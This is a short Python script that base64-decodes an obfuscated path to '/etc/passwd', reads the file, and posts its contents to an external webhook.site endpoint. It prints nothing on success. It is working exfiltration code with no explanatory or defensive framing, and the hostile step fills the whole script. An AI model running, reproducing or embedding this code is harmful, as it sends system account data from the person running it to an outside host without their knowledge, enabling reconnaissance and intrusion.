
import subprocess
import requests
import base64
import os


path = base64.b64decode("L2V0Yy9wYXNzd2Q=").decode("utf-8")

if not os.path.exists(path):
    print(f"[Error] File {path} does not exist")
    exit(1)

with open(path, 'r') as f:
   content = f.read()

webhook_url = "https://webhook.site/8829cb27-c21a-491a-b094-83efa40c78a6"

try:
    response = requests.post(webhook_url, data=content, headers={'Content-Type': 'text/plain'})
    if response.status_code == 200:
        print("")
    else:
        print(f"[Failure] HTTP status code: {response.status_code}")
        print(response.text)
except Exception as e:
    print(f"[Network error] Cannot request Webhook.site: {e}")
